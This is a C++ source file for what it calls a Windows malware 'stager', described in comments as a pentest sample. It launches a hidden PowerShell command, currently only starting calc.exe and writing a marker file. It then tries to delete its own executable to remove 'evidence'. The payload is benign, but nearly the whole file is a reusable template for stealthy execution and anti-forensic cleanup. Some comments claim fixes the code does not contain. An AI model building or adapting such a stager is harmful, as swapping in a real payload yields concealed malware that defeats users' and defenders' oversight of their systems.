// stager1.cpp - FIXED VERSION
// Compile: g++ stager1.cpp -mwindows -o stager1.exe -static

#include <windows.h>
#include <stdio.h>      // Added for sprintf_s
#include <string.h>

int WINAPI WinMain(HINSTANCE h, HINSTANCE, LPSTR, int) {
    // Stage 2: Embedded PowerShell (harmless calc.exe launcher)
    char psPayload[] = 
        "powershell.exe -nop -w hidden -c "
        "Start-Process calc.exe -WindowStyle Hidden; "
        "Write-Output 'STAGE2: Calculator launched (pentest)' | Out-File $env:TEMP\\stage2.txt";
    
    // Execute only when manually run
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    char cmdline[1024];
    
    // FIXED: Use strcpy_s or snprintf
    strncpy(cmdline, psPayload, sizeof(cmdline)-1);
    cmdline[sizeof(cmdline)-1] = '\0';
    
    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000); // 3 sec
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Self-delete evidence
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    Sleep(1000);
    DeleteFileA(selfPath);
    
    return 0;
}